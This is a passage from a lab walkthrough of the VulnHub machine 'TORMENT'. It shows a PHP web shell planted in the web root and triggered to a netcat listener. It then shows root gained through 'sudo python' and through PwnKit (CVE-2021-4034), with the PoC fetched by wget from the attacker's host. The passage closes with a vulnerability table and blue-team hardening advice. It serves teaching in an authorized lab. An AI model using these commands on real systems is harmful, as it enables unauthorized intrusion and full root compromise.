```

Publish the shell and reboot (allowed by `sudo -l`):

```bash
sudo cp /home/patrick/shell.php /var/www/html/shell.php
sudo /bin/systemctl reboot
```

> **Why it works:** `systemctl reboot` is in our `sudo` rules, so the restart is legitimate. On boot
> Apache starts as **`qiu`** because the config says so, and it will run `shell.php` as `qiu`.

After the box comes back, start a listener and trigger the shell:

```bash
nc -lvnp 4444
curl http://192.168.56.101/shell.php
```

```text
$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu)
$ sudo -l
    (root) NOPASSWD: /usr/bin/python
```

> **How to read it:** We are now `qiu`, who may run `python` as root with no password. (On some builds
> the key already got us `qiu`; on others you arrive here as `patrick`.)

### 4.3 Route A — root via `sudo python`

Abuse the allowed `python` (see GTFOBins):


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `python` can spawn a shell, so `sudo python` runs that shell **as root**. Any
> interpreter/binaries on a `sudo` allow-list is a root shell.

### 4.4 Route B (alternative) — PwnKit / pkexec (CVE-2021-4034)

If `pkexec` is SUID (as shown in 4.1), the local privilege-escalation bug in `polkit`'s `pkexec`
grants root. Fetch the public PoC, compile it, run it:

```bash
cd /tmp
wget http://192.168.56.10:8000/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** CVE-2021-4034 abuses how `pkexec` handles `argc`/`argv` to run an attacker
> controlled environment. It is a *fallback* — the author nudges you toward the intended path, so
> practise Route A first. PoC source: <https://github.com/ly4k/PwnKit>.

### 4.5 The root flag

```bash
cd /root
cat proof.txt
cat author-secret.txt
```

```text
<root flag — varies by build>
```

> **Note:** Flag filenames and contents differ between builds. Look for `proof.txt` and
> `author-secret.txt` in `/root`.

![root shell and flags](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP exposing `.ssh/id_rsa` and `.ngircd/channels` | vsftpd, port 21 | Private-key and IRC channel disclosure |
| 2 | Default service password left unchanged (`ngircd`) | IRC, ports 6667-6669 | Unauthorised access to internal chat |
| 3 | Secret (SSH key passphrase) stored in an IRC channel topic | `#tormentedprinter` | Unlocks the stolen SSH key → shell as `patrick` |
| 4 | World-writable Apache config (`User`/`Group`) | `/etc/apache2/apache2.conf` | Web server runs as a chosen user → shell as `qiu` |
| 5 | Over-broad `sudo` rules (`systemctl reboot`, `python`, ...) | `sudo -l` | Reboot + arbitrary root command execution |
| 6 | Outdated SUID `pkexec` vulnerable to PwnKit | `/usr/bin/pkexec` | Local privilege escalation to root (CVE-2021-4034) |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never expose `.ssh` or application config directories. A private key
  in an anonymous share is an account compromise waiting to happen.
- **Change default credentials** on every service (`ngircd`'s documented default is public knowledge).
  Rotate secrets and audit for unchanged defaults.
- **Never store secrets where other users can read them** — IRC channel topics, motd banners, and
  shared files are not secure channels.
- **Harden file permissions.** Configuration files (especially `/etc/apache2/*.conf`) must be
  root-owned and not world-writable. A writable service config is effectively root.
- **Restrict `sudo` to exact, necessary commands.** `python`, shells, and `systemctl reboot` are all
  trivially abusable. Use `sudoedit` for edits and remove interpreter entries.
- **Patch `polkit`/`pkexec`.** Apply CVE-2021-4034 fixes and monitor for SUID binaries. Keep the OS
  and all packages up to date.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [VulnHub official entry — digitalworld.local: TORMENT](https://vulnhub.com/entry/digitalworldlocal-torment,299/)
- [ngircd — free IRC server for small networks (default config)](https://ngircd.barton.de/)
- [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/)
- [CVE-2021-4034 (PwnKit) — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
- [PwnKit proof-of-concept (ly4k)](https://github.com/ly4k/PwnKit)
- [CUPS printing system](https://www.cups.org/) · [Postfix](http://www.postfix.org/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — full TCP scan (FTP, SMTP, CUPS, ngircd, NFS, Samba)
- [ ] `images/03-irc.png` — IRC channel `#tormentedprinter` showing the passphrase topic
- [ ] `images/04-shell.png` — SSH shell as `patrick` using the key + passphrase
- [ ] `images/05-root-flag.png` — root shell and `proof.txt` / `author-secret.txt`
- [ ] `images/06-ftp-dotfiles.png` — anonymous FTP listing the `.ssh` and `.ngircd` directories
- [ ] `images/07-smtp-vrfy.png` — `VRFY` confirming `patrick` and `qiu`
- [ ] `images/08-sudo-l.png` — `sudo -l` and the world-writable `apache2.conf`

> **How to read it:** Store screenshots in `labs/4-079-digitalworldlocal-torment/images/` and reference them
> here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
